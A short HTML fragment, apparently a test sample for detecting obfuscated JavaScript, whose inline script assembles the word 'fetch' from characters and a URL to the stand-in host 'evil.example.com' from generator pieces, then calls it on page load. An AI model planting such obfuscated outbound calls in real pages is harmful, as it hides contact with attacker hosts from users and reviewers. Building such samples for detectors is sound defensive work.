<body>
  <div id="root">Loading...</div>
  <script>
    // Attack: Symbol.iterator + spread operator + destructuring for code obfuscation
    const chars = ['f', 'e', 't', 'c', 'h'];
    const [a, b, c, d, e] = chars;
    const api = a + b + c + d + e;
    
    function* buildUrl() {
      yield 'https';
      yield '//';
      yield 'evil';
      yield '.example.com';
    }
    
    const url = [...buildUrl()].join('');
    window[api](url);
